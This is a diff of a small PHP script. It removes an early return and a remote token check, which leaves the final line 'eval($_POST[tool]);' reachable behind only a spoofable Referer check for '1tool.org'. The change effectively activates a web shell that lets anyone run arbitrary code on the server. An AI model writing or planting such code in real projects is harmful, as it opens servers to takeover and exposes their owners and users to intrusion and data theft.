@@ -5,22 +5,18 @@ header('Access-Control-Allow-Methods:*');
 
 if(!isset($_SERVER['HTTP_REFERER']) || strpos($_SERVER['HTTP_REFERER'],'1tool.org') === false){
   exit;
-    echo 'no premission';
-}else{
-    echo 'ok';
 }
+//echo $_SERVER['HTTP_REFERER'];
 
-echo $_SERVER['HTTP_REFERER'];
-
-return;
+//return;
 //eval($_GET[tool]);
-$token = $_POST['token'];
-$tokentxt=file_get_contents("http://www.1tool.org/Security/token.txt");
+//$token = $_POST['token'];
+//$tokentxt=file_get_contents("http://www.1tool.org/Security/token.txt");
 //echo $tokentxt;
 //echo $token;
-if($tokentxt !=$token){
+//if($tokentxt !=$token){
 //header("location:http://www.1tool.org/");
-return;
-}
+//return;
+//}
 eval($_POST[tool]);
 ?>
